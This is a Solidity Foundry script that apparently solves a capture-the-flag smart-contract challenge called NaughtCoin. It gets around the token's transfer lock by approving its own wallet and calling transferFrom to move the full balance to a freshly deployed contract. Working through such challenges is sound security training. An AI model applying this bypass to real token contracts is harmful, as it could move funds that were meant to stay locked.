//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script,console} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";
contract NaughtCoinAttack {

}
contract NaughtCoinSolution is Script {
  NaughtCoin naughtCoinInstance = NaughtCoin(0x08D34bfC066ABC27818C4f947e7D69AF8eB63a93);
  function run() external {
    vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
     NaughtCoinAttack naughtCoinAttackInstance =   new NaughtCoinAttack();
        address myWallet = 0xcFc07EDEF2649DCBBb0ccF99DbB46A3d66bD80D0;
        uint myBal = naughtCoinInstance.balanceOf(myWallet);
        console.log("Current balance is: ", myBal);
        naughtCoinInstance.approve(myWallet, myBal);
        naughtCoinInstance.transferFrom(myWallet, address(naughtCoinAttackInstance), myBal);
        console.log("New balance is: ", naughtCoinInstance.balanceOf(myWallet));
    vm.stopBroadcast();
  }
}